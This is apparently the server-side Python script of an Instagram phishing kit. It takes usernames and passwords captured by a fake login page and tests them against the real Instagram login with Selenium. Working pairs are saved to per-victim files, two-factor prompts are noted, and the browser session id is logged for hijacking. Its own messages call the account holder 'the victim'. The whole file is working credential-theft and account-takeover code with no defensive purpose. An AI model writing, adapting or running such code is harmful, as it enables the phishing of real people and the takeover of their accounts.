#!"C:\Users\4N0NYM4U5\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Python 3.7"
from selenium import webdriver
from time import sleep
import os
import sys
from time import sleep
from colorama import init
from termcolor import colored
from selenium.webdriver.chrome.options import Options

def failure_box(text):
	init ()
	print(colored(' [','white') + colored('×','red') + colored('] ','white') + text)

def success_box(text):
	init ()
	print(colored(' [','white') + colored('+','green') + colored('] ','white') + text
)
def WrongCreds():
	try:
		os.rmdir(dir_path)
		os.remove('D:/xampp/htdocs/instagram/accounts/login/&source=auth_switcher/data.txt')
		os.system('python run.py')
	except:
		junk=1

def WriteURL(URL):
	with open("D:/xampp/htdocs/instagram/accounts/login/&source=auth_switcher/url.txt",'a+') as f:
		f.write(URL)
		f.close()

def LogIn(USERNAME,PASSWD,browser,dir_path):
	browser.get("https://www.instagram.com/accounts/login/")
	sleep(5)
	before_login_url = browser.current_url
	username = browser.find_element_by_xpath(
		'//*[@id="react-root"]/section/main/div/article/div/div[1]/div/form/div[2]/div/label/input')
	username.send_keys(USERNAME)
	password = browser.find_element_by_xpath(
		'//*[@id="react-root"]/section/main/div/article/div/div[1]/div/form/div[3]/div/label/input')
	password.send_keys(PASSWD)
	sleep(5)
#	browser.find_element_by_xpath('/html[1]/body[1]/div[1]/section[1]/main[1]/div[1]/article[1]/div[1]/div[1]/div[1]/form[1]/div[4]/button[1]/div[1]').click()
	
	try:
		LogIn = browser.find_element_by_xpath(
			"//div[contains(text(),'Log In')]")
		LogIn.click()
	except:
		junk = 1
	after_login_url = browser.current_url
	if(browser.current_url == "https://www.instagram.com/"):
		log_in_status = 1
		browser.close()
	elif(before_login_url == after_login_url):
		log_in_status = 0
		browser.close()
	elif "two_factor" in browser.current_url:
		log_in_status = 2
	else:
		failure_box("Instagram has detected some suspicious activity...")
	return log_in_status

def ReadCredentials(FILE):	
	with open(FILE,'r') as f:
		text = f.readlines()
		f.close()
	text = list(text)
	param1 = text[0]
	param1 = param1[0:-1]
	param2 = text[1]
	return param1, param2

def WriteCredentials():
	path = dir_path + "/credentials.txt"
	with open(path,'w') as f:
		f.write("Username    :    " + USERNAME)
		f.write("\nPassword    :    " + PASSWD)
		f.close()
	return path

if __name__ == '__main__':

	chrome_options = Options()
	if(sys.argv[1] == '--headless' or sys.argv[1] == '--start-maximised'):
		chrome_options.add_argument(sys.argv[1])
	else:
		failure_box(sys.argv[1] + 'option not found.')

	chrome_options.add_experimental_option("detach", True)
	browser=webdriver.Chrome(executable_path='C:/chromedriver.exe',chrome_options=chrome_options,service_log_path='NUL')
	USERNAME, PASSWD = ReadCredentials('D:/xampp/htdocs/instagram/accounts/login/&source=auth_switcher/data.txt')
	success_box('Username : %s' % USERNAME)
	success_box('Password : %s' % PASSWD)
	dir_path = "D:/xampp/htdocs/instagram/"  + USERNAME
	if os.path.isdir(dir_path):
		junk = 1
	else:
		os.mkdir(dir_path)

	log_in_status = LogIn(USERNAME,PASSWD,browser,dir_path)
	if(log_in_status == 0):
		URL="/instagram/accounts/login/&source=auth_switcher/"
		failure_box("Invalid credentials passed by the victim...")
		WriteURL(URL)
	elif(log_in_status == 1):
		WriteCredentials()
		success_box("Security type : None...")
		URL="https://www.instagram.com/"
		with open("D:/xampp/htdocs/instagram/accounts/login/&source=auth_switcher/url.txt",'w') as f:
			f.write(URL)
			f.close()
	elif(log_in_status == 2):
		WriteCredentials()
		success_box("Security type : Two Factor Authentication...")
		URL="/instagram/accounts/login/two_factor&source=auth_switcher&next/"
		WriteURL(URL)
	sleep(2)
	url = browser.command_executor._url
	session_id = browser.session_id
	usage = USERNAME + '\n' + PASSWD + str(log_in_status) + '\n' + dir_path + '\n' + url + '\n' + str(session_id)
	with open('D:/xampp/htdocs/instagram/scripts/log.txt','w') as f:
		f.write(usage)
		f.close()